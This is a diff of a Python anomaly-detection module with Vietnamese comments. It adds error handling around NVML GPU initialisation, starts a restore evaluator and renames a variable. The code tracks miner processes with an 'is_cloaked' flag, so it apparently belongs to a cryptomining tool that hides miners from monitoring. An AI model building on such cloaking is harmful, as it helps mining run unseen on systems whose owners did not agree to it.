@@ -10,7 +10,7 @@ from typing import List, Dict, Any
 from contextvars import ContextVar
 
 from .utils import MiningProcess
-from .anomaly_evaluator import SafeRestoreEvaluator
+from .anomaly_evaluator import SafeRestoreEvaluator  # Chỉ import, không định nghĩa lại
 
 from .auxiliary_modules.models import ConfigModel
 from .auxiliary_modules.event_bus import EventBus
@@ -26,8 +26,11 @@ async def initialize_nvml():
     global _nvml_initialized
     async with _nvml_lock:
         if not _nvml_initialized:
-            pynvml.nvmlInit()
-            _nvml_initialized = True
+            try:
+                pynvml.nvmlInit()
+                _nvml_initialized = True
+            except pynvml.NVMLError as e:
+                raise RuntimeError(f"Lỗi khi khởi tạo NVML: {e}") from e
 
 def is_nvml_initialized() -> bool:
     return _nvml_initialized
@@ -83,6 +86,12 @@ class AnomalyDetector:
             await initialize_nvml()
             self.logger.info("NVML đã được khởi tạo (một lần).")
 
+        # Khởi động SafeRestoreEvaluator
+        try:
+            await self.safe_restore_evaluator.start()  # Đảm bảo start() là async
+        except Exception as e:
+            self.logger.error(f"Lỗi khi khởi động SafeRestoreEvaluator: {e}\n{traceback.format_exc()}")
+
         # Tạo các coroutine background
         loop = asyncio.get_event_loop()
         self.task_futures.append(loop.create_task(self.anomaly_detection()))
@@ -110,9 +119,9 @@ class AnomalyDetector:
                             if cpu_name in pname or gpu_name in pname:
                                 prio = self.get_process_priority(proc.info['name'])
                                 net_if = self.config.network_interface
-                                mp = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
-                                mp.is_cloaked = False
-                                self.mining_processes.append(mp)
+                                mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
+                                mining_proc.is_cloaked = False
+                                self.mining_processes.append(mining_proc)
                         except Exception as e:
                             self.logger.error(f"Lỗi khi xử lý tiến trình {proc.info['name']}: {e}")
                     if not self.mining_processes:
@@ -128,6 +137,9 @@ class AnomalyDetector:
                 await asyncio.sleep(1)
 
     def get_process_priority(self, process_name: str) -> int:
+        """
+        Lấy độ ưu tiên (priority) dựa trên config.
+        """
         priority_map = self.config.process_priority_map
         val = priority_map.get(process_name.lower(), 1)
         if not isinstance(val, int):
